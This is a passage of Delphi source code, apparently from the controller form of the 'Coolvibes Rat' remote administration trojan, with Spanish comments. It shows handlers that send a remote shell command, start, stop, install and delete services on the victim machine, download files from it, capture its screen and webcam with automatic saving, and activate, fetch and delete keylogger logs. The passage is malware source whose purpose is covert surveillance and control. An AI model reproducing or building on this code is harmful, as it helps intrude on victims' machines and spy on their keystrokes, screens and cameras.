  if ListViewDescargas.Items.Item[i - 1].SubItems[0] = _('En espera') then
    begin
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i - 1];
      ListViewDescargas.Items.Item[i - 1] := Item;
      ListViewDescargas.ItemIndex := i - 1;
      Item.Free;
    end;
end;

//Bajar un puesto

procedure TFormControl.Bajar1Click(Sender: TObject);
var
  Item: TListItem;
  i: Integer;
begin
  if ListViewDescargas.ItemIndex = ListViewDescargas.Items.Count - 1 then
    Exit; //Si es el �ltimo...
  //Si su item inferior est� tambien en espera se intercambia con �l
  i := ListViewDescargas.ItemIndex;
  if ListViewDescargas.Items.Item[i + 1].SubItems[0] = _('En espera') then
    begin
      Item := TListItem.Create(ListViewDescargas.Items);
      Item.Assign(ListViewDescargas.Selected);
      ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i + 1];
      ListViewDescargas.Items.Item[i + 1] := Item;
      ListViewDescargas.ItemIndex := i + 1;
      Item.Free;
    end;
end;

//Bajar al ultimo puesto

procedure TFormControl.ltimopuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: Integer;
begin
  //Buscamos el �ltimo item en espera y le insertamos ahi
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
      begin
        if ListViewDescargas.ItemIndex = i then
          Exit; //Es el �ltimo item en espera no se puede bajar m�s
        Item := TListItem.Create(ListViewDescargas.Items);
        Item.Assign(ListViewDescargas.Selected);
        for j := i + 1 to ListViewDescargas.Selected.Index do
          ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j + 1];
        ListViewDescargas.Items.Item[i] := Item;
        ListViewDescargas.ItemIndex := i;
        Item.Free;
        break;
      end;
end;

procedure TFormControl.Activar2Click(Sender: TObject);
begin
  MemoShell.Lines.Clear;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|ACTIVAR')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if Key = #13 then
    begin
      if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
        MemoShell.Text := '';

      Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);

      //Agrega el comando que acabo de escribir a la lista de comandos del combobox
      if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
        begin
          if ComboBoxShellCommand.Text <> ComboBoxShellCommand.Items[0] then
            ComboBoxShellCommand.Items.Insert(0, ComboBoxShellCommand.Text);
        end
      else
        ComboBoxShellCommand.Items.Add(ComboBoxShellCommand.Text);
      //limpiar comando
      ComboBoxShellCommand.Text := '';
    end;
end;

procedure TFormControl.BtnCambiarFuenteShellClick(Sender: TObject);
begin
  if DlgFont.Execute then
    begin
      MemoShell.Font := DlgFont.Font;
      ComboBoxShellCommand.Font := DlgFont.Font;
      if MemoShell.Color = MemoShell.Font.Color then
        MessageBoxw(Handle,
          Pwidechar(_('Se escogi� el mismo color para la fuente y el fondo. Escoge otro.')),
          Pwidechar(_('Advertencia')), 0 + MB_IconWarning);
    end;
end;

procedure TFormControl.BtnCambiarColorShellClick(Sender: TObject);
begin
  if DlgColors.Execute then
    begin
      MemoShell.Color := DlgColors.Color;
      ComboBoxShellCommand.Color := DlgColors.Color;
      if MemoShell.Color = MemoShell.Font.Color then
        MessageBoxw(Handle,
          PWidechar(_('Se escogi� el mismo color para la fuente y el fondo. Escoge otro.')),
          PWidechar(_('Advertencia')), 0 + MB_IconWarning);
    end;
end;

procedure TFormControl.PopupShellPopup(Sender: TObject);
begin
  Activar2.Enabled := not ComboBoxShellCommand.Enabled;
  Desactivar2.Enabled := ComboBoxShellCommand.Enabled;
end;

procedure TFormControl.Desactivar2Click(Sender: TObject);
begin
  ComboBoxShellCommand.Enabled := False;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('SHELL|DESACTIVAR')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Guardarcmo1Click(Sender: TObject);
begin
  DlgGuardar.Title := _('Guardar texto :: Coolvibes ::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter := _('Archivo de texto') + ' (*.txt)|*.txt';
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
    begin
      MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
      Estado(_('Archivo guardado como: ') + DlgGuardar.FileName);
    end;
end;

procedure TFormControl.BtnServiciosClick(Sender: TObject);
begin
  if not BtnServicios.Enabled then Exit;
  BtnServicios.Enabled := False;
  ListviewServicios.Enabled := False;
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;
  ListViewServicios.Clear;
  Servidor.Connection.Writeln('LISTARSERVICIOS');
end;

procedure TFormControl.DEtener1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;
  mslistviewitem := ListViewServicios.Selected;
  while Assigned(mslistviewitem) do
    begin
      Servidor.Connection.Writeln('DETENERSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormControl.Iniciar1Click(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  mslistviewitem := ListViewServicios.Selected;
  while Assigned(mslistviewitem) do
    begin
      Servidor.Connection.Writeln('INICIARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormControl.Desinstalar1Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  mslistviewitem := ListViewServicios.Selected;
  while Assigned(mslistviewitem) do
    begin
      Servidor.Connection.Writeln('BORRARSERVICIO' + mslistviewitem.Caption);
      mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormControl.Instalar1Click(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := True;
  BtnCancelarInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Visible := True;
  MultiEditInstalarServicio.Text := _('{Escribir el nombre del servicio}');
end;

procedure TFormControl.BtnCancelarInstalarServicioClick(Sender: TObject);
begin
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.btnSiguienteInstalarServicioClick(Sender: TObject);
begin
  NombreSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := _('{Escribir la descripci�n del servicio}');
  btnSiguienteInstalarServicio.Visible := False;
  btnInstServicios.Visible := True;
end;

procedure TFormControl.btnInstServiciosClick(Sender: TObject);
begin
  descripcionSI := MultiEditInstalarServicio.Text;
  MultiEditInstalarServicio.Text := _('{Ruta del ejecutable a poner de servicio}');
  btnInstServicios.Visible := False;
  btnInstServicios2.Visible := True;
end;

procedure TFormControl.btnInstServicios2Click(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;
  RutaSI := MultiEditInstalarServicio.Text;
  Servidor.Connection.Writeln('INSTALARSERVICIO' + nombresi + '|' +
    descripcionSI + '|' + rutaSi + '|');
  btnSiguienteInstalarServicio.Visible := False;
  BtnCancelarInstalarServicio.Visible := False;
  MultiEditInstalarServicio.Visible := False;
  btnInstServicios.Visible := False;
  btnInstServicios2.Visible := False;
end;

procedure TFormControl.PopupDescargasPopup(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected = nil then
    Exit;
  if ListViewDescargas.Selected.Data = nil then
    Exit;

  Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
  if not Descarga.Transfering then
    PopUpDescargas.Items[0].Enabled := False; //menu Detener descarga

  if Descarga.cancelado then
    PopUpDescargas.Items[1].Enabled := True;
end;

procedure TFormControl.DetenerDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  mslistviewitem := ListViewDescargas.Selected;
  if mslistviewitem = nil then
    Exit;

  while Assigned(mslistviewitem) do
    begin
      if mslistviewitem.Data <> nil then
        begin
          Descarga := TDescargaHandler(mslistviewitem.Data);
          if Descarga.Transfering then
            Descarga.CancelarDescarga;
        end;
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;

end;

procedure TFormControl.ReanudarDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  mslistviewitem := ListViewDescargas.Selected;
  if mslistviewitem = nil then
    Exit;

  while Assigned(mslistviewitem) do
    begin
      if mslistviewitem.Data <> nil then
        begin
          Descarga := TDescargaHandler(mslistviewitem.Data);
          if not Descarga.Transfering then
            Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
              '|' + IntToStr(Descarga.Descargado));
        end;
      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;

end;

procedure TFormControl.Agregaracoladedescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  FilePath: AnsiString;
  Size: Integer;
begin
  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    mslistviewitem := ListViewArchivos.Selected
  else
    mslistviewitem := ListViewBuscar.Selected;

  if mslistviewitem = nil then Exit;

  CrearDirectoriosUsuario();
  while Assigned(mslistviewitem) do
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        begin
          FilePath := EditPathArchivos.Text + mslistviewitem.Caption;
          Size := StrToInt(mslistviewitem.SubItems.Strings[4]);
        end
      else
        begin
          FilePath := mslistviewitem.subitems[0];
          Size := StrToInt(mslistviewitem.SubItems.Strings[5]);
        end;
      Descarga := TDescargaHandler.Create(nil, FilePath, Size,
        DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
      Descarga.callback := Self.TransferFinishedNotification;
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormControl.EditPathArchivosKeyPress(Sender: TObject; var Key: char);
begin
  if (key = #13) then
    begin
      EditPathArchivos.Text := Trim(EditPathArchivos.Text);
      Self.BtnActualizarArchivos.Click;
    end;
end;

//El evento OnClick es igual para todos los listviews

procedure TFormControl.ListViewProcesosColumnClick(Sender: TObject;
  Column: TListColumn);
begin
  Columna := Column.Index;
  (Sender as TListView).AlphaSort;
  if Columna <> ColumnaOrdenada then //Para acordarnos por que columna est� ordenado
    ColumnaOrdenada := Columna
  else
    ColumnaOrdenada := -1;
end;

//Este evento lo comparten varios ListViews, aquellos que en la columna 0 y 2 sean cadenas y la 1 sea un numero

procedure TFormControl.ListViewProcesosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then //Si Columna = 0 usar Item.Caption
    begin
      Str1 := Item1.Caption;
      Str2 := Item2.Caption;
    end
  else
    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
      if Item1.SubItems.Count < Columna then
        Str1 := ''
      else
        Str1 := Item1.SubItems[Columna - 1];
      if Item2.SubItems.Count < Columna then
        Str2 := ''
      else
        Str2 := Item2.SubItems[Columna - 1];
    end;
  if Columna in [0, 2] then //Son tratadas como cadenas
    Compare := CompareText(Str1, Str2)
  else //Columna 1, PID
    Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
  //Si la columna ya fue ordenada anteriormente, invertir el orden
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1; //Invertimos el resultado
  (Sender as TListView).SetFocus;
end;

//Para el registro y los servicios las 3 columnas son cadenas

procedure TFormControl.ListViewRegistroCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then //Si Columna = 0 usar Item.Caption
    begin
      Str1 := Item1.Caption;
      Str2 := Item2.Caption;
    end
  else
    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
      if Item1.SubItems.Count < Columna then
        Str1 := ''
      else
        Str1 := Item1.SubItems[Columna - 1];
      if Item2.SubItems.Count < Columna then
        Str2 := ''
      else
        Str2 := Item2.SubItems[Columna - 1];
    end;
  Compare := CompareText(Str1, Str2);
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

//Para ordenar ficheros

procedure TFormControl.ListViewArchivosCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
var
  Str1, Str2: string;
begin
  if Columna = 0 then //Si Columna = 0 usar Item.Caption
    begin
      Str1 := Item1.Caption;
      Str2 := Item2.Caption;
    end
  else
    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
      if Item1.SubItems.Count < Columna then
        Str1 := ''
      else
        Str1 := Item1.SubItems[Columna - 1];
      if Item2.SubItems.Count < Columna then
        Str2 := ''
      else
        Str2 := Item2.SubItems[Columna - 1];
    end;

  if Item1.Caption = '<..>' then //Siempre arriba
    begin
      Compare := Low(Integer); //El minimo valor posible de un Integer
      Exit;
    end;
  case Columna of
    0:
      begin
        Compare := CompareText(Str1, Str2);
      end;
    1: Compare := ObtenerMejorUnidadInv(Str1) - ObtenerMejorUnidadInv(Str2);
    2: Compare := CompareText(Str1, Str2);
    3: Compare := CompareText(Str1, Str2);
    4: Compare := Round(StrToDateTime(Str1) - StrToDateTime(Str2));
  end;
  if Columna = ColumnaOrdenada then
    Compare := Compare * -1;
end;

procedure TFormControl.Iralproceso1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    begin
      if ListViewVentanas.Selected = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else //Recibe el PID de la ventana con Handle
        Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
begin
  try
    if SpinCaptureScreen.Value < 0 then
      SpinCaptureScreen.Value := 0;
    if SpinCaptureScreen.Value > 30 then
      SpinCaptureScreen.Value := 30;
    TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
  except
  end;
end;

procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCapturaScreen.Checked then
    begin
      imgCaptura.Picture := nil; //Refrescamos
      BtnCapturarScreen.Click; //Hacemos la primera captura
    end;

  TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
  TimerCaptureScreen.Enabled := CheckBoxAutoCapturaScreen.Checked;
  TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
end;

procedure TFormControl.Previsualizarjpg1Click(Sender: TObject);
var
  i: Integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    mslistviewitem := ListViewArchivos.Selected
  else
    mslistviewitem := ListViewBuscar.Selected;

  while Assigned(mslistviewitem) do
    begin
      if (FormVisorDeMiniaturas = nil) then
        FormVisorDeMiniaturas := TObject(TFormVisorDeMiniaturas.Create(Self, servidor, Self));
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := (EditPathArchivos.Text + mslistviewitem.Caption)
      else
        FilePath := mslistviewitem.subitems[0];

      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);

      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])

    end;

end;

procedure TFormControl.SpinCamChange(Sender: TObject);
begin
  try
    if SpinCam.Value < 0 then
      SpinCam.Value := 0;
    if SpinCam.Value > 30 then
      SpinCam.Value := 30;
    TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
  except
  end;
end;

procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCamCapture.Checked then
    begin
      imgWebcam.Picture := nil; //Refrescamos
      BtnCapturarWebcam.Click; //Hacemos la primera captura
    end;

  TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
  TimerCamCapture.Enabled := CheckBoxAutoCamCapture.Checked;
  TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
end;

procedure TFormControl.TimerCamCaptureTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      Self.TimerCamCapture.Enabled := False;
      Exit;
    end;
  BtnCapturarWebcam.Click;

end;

procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
  Sender: TObject);
begin
  BtnRefrescarVentanas.Click;
end;

procedure TFormControl.agregardescarga(FileName: string);
var
  i: Integer;
  Descarga: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)
  for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = FileName then Exit;
    end;
  Servidor.Connection.Writeln('GETFILE|' + FileName);
end;

procedure TFormControl.AgregarDescargaEnCola(FileName: string; tamano: Integer);
var
  i: Integer;
  Descarga, Descarga2: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)

  for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga2 := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga2.Origen = FileName then Exit;
    end;
  CrearDirectoriosUsuario();
  Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
    DirDescargas + ExtractFileName(FileName), ListViewDescargas, True);
  Descarga.callback := TransferFinishedNotification;

end;

procedure TFormControl.CrearDirectoriosUsuario();

  procedure Creadir(dir: string);
  var
    tmp: string;
  begin
    while Pos('\', dir) > 0 do
      begin
        tmp := tmp + Copy(dir, 1, Pos('\', dir));
        Delete(dir, 1, Pos('\', dir));
        if not directoryexists(tmp) then
          CreateDirectory(PChar(tmp), nil);
      end;
  end;
begin
  CreaDir(DirUsuario);
  CreaDir(DirCapturas);
  CreaDir(DirWebcam);
  CreaDir(DirMiniaturas);
  CreaDir(DirDescargas);
end;

procedure TFormControl.Guardarimagen1Click(Sender: TObject);
begin
  DlgGuardar.Title := _('Guardar imagen ::Coolvibes::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter := _('Imagen') + ' .Jpeg|*.jpg';
  DlgGuardar.DefaultExt := 'jpg';
  if DlgGuardar.Execute then
    begin
      if PageControlVigilancia.ActivePage = TabScreencap then
        begin
          //Se est� guardando una captura
          imgCaptura.Picture.SaveToFile(DlgGuardar.FileName);
          ShowMessage('Pantalla');
        end
      else //Sino es una webcam
        begin
          imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
          ShowMessage('Webcam');
        end;
      Estado(_('Imagen guardada como: ') + DlgGuardar.FileName);
    end;
end;

procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
var
  PopupPoint: TPoint;
begin
  PopupPoint.X := TSpeedButton(Sender).Left;
  PopupPoint.Y := TSpeedButton(Sender).Top;
  PopupPoint := ClientToScreen(PopupPoint);

  PopupGuardarPantallaoWebcam.Popup(PopupPoint.X, PopupPoint.Y);

end;

procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
begin
  if PageControlVigilancia.ActivePage = TabScreencap then
    begin //Estamos en la pesta�a Captura de Pantalla
      PopupGuardarPantallaoWebcam.Items[0].Caption := _('Guardar captura de pantalla');
      if (PrefijoGuardarCaptura = '') then
        begin
          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Activar guardado autom�tico');
          PopupGuardarPantallaoWebcam.Items[1].Checked := False;
        end
      else
        begin
          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Desactivar guardado autom�tico');
          PopupGuardarPantallaoWebcam.Items[1].Checked := True;
        end;
    end
  else
    begin	//Estamos en la pesta�a Captura de Webcam
      PopupGuardarPantallaoWebcam.Items[0].Caption := _('Guardar captura de webcam');
      if (PrefijoGuardarWebcam = '') then
        begin
          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Activar guardado autom�tico');
          PopupGuardarPantallaoWebcam.Items[1].Checked := False;
        end
      else
        begin
          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Desactivar guardado autom�tico');
          PopupGuardarPantallaoWebcam.Items[1].Checked := True;
        end;
    end;
end;

procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
begin
  if ((PrefijoGuardarCaptura = '') and (PageControlVigilancia.ActivePage = TabScreencap)) then
    PrefijoGuardarCaptura := InputBox(_('Prefijo captura'), _('Prefijo captura'), _('captura_'))
  else if ((PrefijoGuardarWebcam = '') and (PageControlVigilancia.ActivePage = TabWebcam)) then
    PrefijoGuardarWebcam := InputBox(_('Prefijo captura'), _('Prefijo captura'), _('webcam_'))
  else if ((PrefijoGuardarCaptura <> '') and (PageControlVigilancia.ActivePage = TabScreencap)) then
    PrefijoGuardarCaptura := ''
  else if ((PrefijoGuardarWebcam <> '') and (PageControlVigilancia.ActivePage = TabWebcam)) then
    PrefijoGuardarWebcam := '';
end;

procedure TFormControl.TabKeyloggerShow(Sender: TObject);
begin
  if (not ProgressBarKeylogger.Enabled) then //al mostrarnos por primera vez
    begin
      SpeedButtonRecibirLog.Enabled := False; //no se ponen deshabilitados desde el principio porque dan error: Controlador no valido
      EditLogName.Enabled := False;
      SpeedButtonGuardarLog.Enabled := False;
      SpeedButtonActivarKeylogger.Enabled := False;
      SpeedButtonEliminarLog.Enabled := False;
      Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
    end;
end;

procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then Exit;
  if not SpeedbuttonRecibirlog.Enabled then Exit;
  SpeedButtonRecibirLog.Enabled := False;
  Servidor.connection.WriteLn('RECIBIRKEYLOGGER');
end;

procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
begin
  SpeedButtonActivarKeylogger.Enabled := False;
  if (SpeedButtonActivarKeylogger.Caption = _('Activar Keylogger')) then
    begin
      if (EditLogName.Text <> '') then
        Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|' + EditLogName.Text + '|')
      else
        SpeedButtonActivarKeylogger.Enabled := True;
    end
  else
    Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');

end;

procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
begin
  Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
end;

procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);

  function BooleanToStr(Bool: Boolean; TrueString, FalseString: string): string;
  begin
    if Bool then
      Result := TrueString
    else
      Result := FalseString;
  end;
begin
  if not Servidor.Connection.Connected then Exit;
  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|' + BooleanToStr(CheckBoxOnlineKeylogger.Checked, 'ACTIVAR', 'DESACTIVAR') + '|');
end;

procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
begin
  DlgGuardar.Title := _('Guardar Log de Keylogger ::Coolvibes Rat::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter := _('Texto .txt');
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
    begin
      RichEditKeylogger.plaintext := True; //Se guarda como archivo de texto plano
      RichEditKeylogger.Lines.savetofile(DlgGuardar.FileName);

      Estado(_('Log guardado como: ') + DlgGuardar.FileName);
    end;
end;

procedure TFormControl.TabServidorShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnActualizarServidorInfo.Click;
end;

procedure TFormControl.TabVentanasShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnRefrescarVentanas.Click;
end;

procedure TFormControl.TabServiciosShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnServicios.Click;
end;

procedure TFormControl.TabScreencapShow(Sender: TObject);
begin
  if Servidor.Connection.connected then
    Servidor.Connection.Writeln('DATOSCAPSCREEN');
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    begin
      imgCaptura.Picture := nil; //Refrescamos
      BtnCapturarScreen.Click;
    end;
end;

procedure TFormControl.TabWebcamShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) and (ComboboxWebcam.Text = '') then
    BtnObtenerWebcams.Click;
end;

procedure TFormControl.CheckBoxTamanioRealClick(Sender: TObject);
begin
  if CheckBoxTamanioReal.Checked then
    begin
      imgcaptura.align := alNone;
      imgCaptura.Height := alturapantalla; //La anchura se calcula sola al recibir la captura
    end
  else
    begin
      imgcaptura.align := alLeft;
    end;
  BtnCapturarScreen.Click;
end;

procedure TFormControl.PrevisualizarImagenes1Click(Sender: TObject);
begin
  PrevisualizarImagenes1.Checked := not PrevisualizarImagenes1.Checked;
  PrevisualizacionActiva := PrevisualizarImagenes1.Checked;

  if PrevisualizacionActiva then //iconos grades
    begin
      Listviewarchivos.viewstyle := vsIcon;
    end
  else
    begin
      Listviewarchivos.viewstyle := vsReport;
    end;

  BtnActualizarArchivos.Click;
end;

procedure TFormControl.Copiar1Click(Sender: TObject);
begin

  if Servidor.Connection.Connected then
    begin
      mslistviewitem := ListViewArchivos.Selected;
      while Assigned(mslistviewitem) do
        begin
          PortaPapeles := Portapapeles + EditPathArchivos.Text + mslistviewitem.Caption + '|';
          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);

end;

procedure TFormControl.Pegar1Click(Sender: TObject);
var
  tmp: string;
begin
  while Pos('|', portapapeles) > 0 do
    begin
      tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
      Delete(portapapeles, 1, Pos('|', PortaPapeles));
      Servidor.Connection.Writeln('COPYF|' + tmp + '|' + EditPathArchivos.Text + extractfilename(tmp) + '|');
    end;
  btnactualizararchivos.Click;
end;

procedure TFormControl.CargarThumbsFileAlListview(thumbsfilepath: string);
var
  ThumbsDBFile: TStorage; //TStorage for thumbs.db file
  ThumbsDBCatalog: TStream; //TStream for file catalog inside thumbs.db
  ThumbsDB_JPEG: TStream; //stream for thumb image inside thumbs.db
  ThmInfo: TAxThumbsDBFileInfo; //info structure for each item in thumbs.db
  i, j, o: dword; //indexes
  FileName: string; //Filename read from catalog
  WideChr: Word; //placeholder to read widechar filename
  dwIndex: dword; //placeholder to calculate item names
  IndexStr: string; //name of TStorage item for each catalog item
  ThumbnailItems: TStringList;
  FCatalogSignatur: dword; //unknown dword with value 00 07 00 10 hex
  FCatalogItemCount: dword; //number of items in catalog
  FCatalogThumbSize: TSize; //max. size of thumbnails
  bit, nbit: Tbitmap;
  tmpint, tmpint2: Integer;
  imglist: Timagelist;
  t: Integer;
begin
  listviewarchivos.Items.beginupdate;
  cargariconos(False);
  ThumbnailItems := TStringList.Create;
  imglist := Timagelist.Create(nil);
  imglist.Width := Iconosgrandes.Width;
  imglist.Height := Iconosgrandes.Height;
  ThumbsDBFile := TStgFile.OpenFile(thumbsfilepath, STGM_READ or STGM_SHARE_EXCLUSIVE);
  try
    //open catalog of files inside thumbs.db
    ThumbsDBCatalog := ThumbsDBFile.OpenStream('Catalog', STGM_READ or STGM_SHARE_EXCLUSIVE);
    try
      //read catalog
      //first dword = ??? always 00070010 hex
      ThumbsDBCatalog.read(FCatalogSignatur, 4);
      //second dword = number of items
      ThumbsDBCatalog.read(FCatalogItemCount, 4);
      //dword 3+4 = size of thumbs, not used
      ThumbsDBCatalog.read(FCatalogThumbSize, 8);

      for i := 0 to FCatalogItemCount - 1 do
        begin
          ThmInfo := TAxThumbsDBFileInfo.Create;

          //first dword = ??? always 2x000000 hex
          ThumbsDBCatalog.read(ThmInfo.dwFirstDummy, 4);
          //second dword = index of item
          ThumbsDBCatalog.read(ThmInfo.dwIndex, 4);
          //dword 3+4 date and time ???
          ThumbsDBCatalog.read(ThmInfo.dwFileDate, 4);
          //second dword = index of item
          ThumbsDBCatalog.read(ThmInfo.dwThumbDate, 4);

          //read filename as widechar and convert to string
          FileName := '';
          repeat
